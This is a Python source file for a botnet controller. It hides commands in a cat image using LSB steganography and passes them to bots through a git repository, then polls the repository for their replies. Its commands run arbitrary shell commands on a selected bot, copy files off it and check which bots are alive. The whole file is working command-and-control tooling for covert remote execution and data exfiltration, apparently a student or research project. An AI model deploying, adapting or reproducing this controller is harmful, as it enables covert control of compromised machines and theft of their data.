
from PIL import Image
from git import Repo
import os
import time
import subprocess

cur_path = os.path.dirname(os.path.realpath(__file__))
repo_path = cur_path + "/5f6e9ef9fe8a3a54b74dff0c94fd61e1"
bots_num = 3
 

# Code below implementing Image Steganography taken from https://www.geeksforgeeks.org/image-based-steganography-using-python/
def genData(data):
        newd = []
        for i in data:
            newd.append(format(ord(i), '08b'))
        return newd

def modPix(pix, data):
    datalist = genData(data)
    lendata = len(datalist)
    imdata = iter(pix)
    for i in range(lendata):
        pix = [value for value in imdata.__next__()[:3] +
                                imdata.__next__()[:3] +
                                imdata.__next__()[:3]]
        for j in range(0, 8):
            if (datalist[i][j] == '0' and pix[j]% 2 != 0):
                pix[j] -= 1
 
            elif (datalist[i][j] == '1' and pix[j] % 2 == 0):
                if(pix[j] != 0):
                    pix[j] -= 1
                else:
                    pix[j] += 1
                # pix[j] -= 1

        if (i == lendata - 1):
            if (pix[-1] % 2 == 0):
                if(pix[-1] != 0):
                    pix[-1] -= 1
                else:
                    pix[-1] += 1
        else:
            if (pix[-1] % 2 != 0):
                pix[-1] -= 1
 
        pix = tuple(pix)
        yield pix[0:3]
        yield pix[3:6]
        yield pix[6:9]
 
def encode_enc(newimg, data):
    w = newimg.size[0]
    (x, y) = (0, 0)
    for pixel in modPix(newimg.getdata(), data):
        newimg.putpixel((x, y), pixel)
        if (x == w - 1):
            x = 0
            y += 1
        else:
            x += 1

# Encode the data to the image
def encode(data):
    image = Image.open(cur_path + "/cat.png", 'r')
    newimg = image.copy()
    encode_enc(newimg, data) 
    new_img_name = repo_path + "/cat.png"
    newimg.save(new_img_name, str(new_img_name.split(".")[1].upper()))

# Decode the data in the image
def decode():
    image = Image.open(repo_path + "/cat.png", 'r')
 
    data = ''
    imgdata = iter(image.getdata())
 
    while (True):
        pixels = [value for value in imgdata.__next__()[:3] +
                                imgdata.__next__()[:3] +
                                imgdata.__next__()[:3]]
        # string of binary data
        binstr = ''
 
        for i in pixels[:8]:
            if (i % 2 == 0):
                binstr += '0'
            else:
                binstr += '1'
 
        data += chr(int(binstr, 2))
        if (pixels[-1] % 2 != 0):
            return data

# ---------------------------------------


# git commands
def git_pull():
    repo = Repo(repo_path)
    repo.git.reset('--hard')
    origin = repo.remote(name="origin")
    origin.pull()

def git_push():
    repo = Repo(repo_path)
    repo.git.add(".")
    repo.index.commit("Some commit message")
    origin = repo.remote(name="origin")
    origin.push()
 

def printHelp():
    print("SH <command> (execute any shell command by the current bot)")
    print("CP <path_to_remote_file> (copy a file from the current bot)")
    print("CH <bot_id> (change bot you are controlling)")
    print("SA (show active bots)")
    print()


def recv(bot, command):
    start = time.time()

    while True:
        git_pull()
        msg = decode()
        if msg[0] == "R":
            if command[0:2] == "SH":
                return msg[1:]
            elif command[0:2] == "CP":
                if msg[1:3] == "OK":
                    file_name = msg[4:]
                    # copy from repository and delete
                    subprocess.run("cp "+repo_path+"/"+file_name+ " .", shell=True, capture_output=True)
                    subprocess.run("rm "+repo_path+"/"+file_name, shell=True, capture_output=True)
                    git_push()
                    return "File "+file_name+" received."
                else:
                    return msg[1:]
        else:
            if time.time() - start > 5:
                return "Timelimit exceeded. Bot "+str(bot)+" is NOT ACTIVE."


def send(bot, command):
    encode(command+"|"+str(bot))
    git_push()
    print("Command sent, waiting for response...")

    response = recv(bot, command)
    print(response)


def changeBot(bot, command):
    try:
        new_bot = int(command[3:])
        if new_bot < 0 or new_bot >= bots_num:
            print("Wrong bot id, try again")
        else:
            bot = new_bot
            print("Now you're controlling bot #"+str(bot))
            print("---------------------------")
    except ValueError:
        print("Wrong bot id, try again")
    return bot



def showActive():
    for i in range(bots_num):
        encode("HB|"+str(i))
        git_push()

        print("Waiting for bot "+str(i)+" ... (5s)")
        time.sleep(5)
        git_pull()

        msg = decode()
        if msg[1] == "1":
            print("Bot " +str(i)+ " ACTIVE")
        else:
            print("Bot " +str(i)+ " NOT ACTIVE")


if __name__ == '__main__' :
    bots_num = int(input("Input number of bots: "))
    bot = 0

    print("Controller commands:")
    printHelp()
    print("---------------------------")
    print("Now you're controlling bot #" + str(bot))
    print("---------------------------")

    # listen for commands
    while True:
        command = input('Enter command (bot '+str(bot)+' selected): ')
        c = command[0:2]
        if c == "SH" or c == "CP":
            send(bot, command)
        elif c == "CH":
            bot = changeBot(bot, command)
        elif c == "SA":
            showActive()         
        else:
            print("Unrecognised command '"+ command +"', available commands are:")
            printHelp()
